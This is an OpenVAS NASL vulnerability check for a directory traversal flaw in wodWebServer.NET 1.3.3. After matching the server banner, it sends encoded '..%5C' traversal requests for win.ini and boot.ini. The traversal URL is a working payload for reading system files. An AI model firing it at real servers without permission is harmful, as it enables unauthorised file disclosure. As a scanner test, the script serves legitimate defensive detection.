###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_wodWebServer_1_3_3.nasl 13 2013-10-27 12:16:33Z jan $
#
# wodWebServer.NET 1.3.3 Directory Traversal
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_summary = "A directory traversal vulnerability in wodWebServer.NET can be
exploited to read files outside of the web root.

wodWebServer.NET 1.3.3 is vulnerable; other versions may also be affected.";


if (description)
{
 script_id(103131);
 script_version("$Revision: 13 $");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:16:33 +0100 (Sun, 27 Oct 2013) $");
 script_tag(name:"creation_date", value:"2011-03-28 13:42:17 +0200 (Mon, 28 Mar 2011)");
 script_bugtraq_id(47050);
 script_tag(name:"cvss_base", value:"5.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
 script_name("wodWebServer.NET 1.3.3 Directory Traversal");

desc = "
 Summary:
 " + tag_summary;

 script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/17053/");

 script_tag(name:"risk_factor", value:"Medium");
 script_description(desc);
 script_summary("Determine if installed wodWebServer.NET is vulnerable");
 script_category(ACT_ATTACK);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2011 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "summary" , value : tag_summary);
 }
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
   
port = get_http_port(default:80);
if(!get_port_state(port))exit(0);

banner = get_http_banner(port:port);
if(!banner || "wodWebServer" >!< banner)exit(0);

files =  make_array("\[extensions\]","windows%5C/win.ini","\[boot loader\]","boot.ini");

foreach file (keys(files)) {

  url = string(dir,"/..%5C/..%5C/..%5C/..%5C/..%5C/..%5C/..%5C/..%5C/",files[file]); 

  if(http_vuln_check(port:port, url:url,pattern:file)) {
     
    security_warning(port:port);
    exit(0);

  }
}
exit(0);
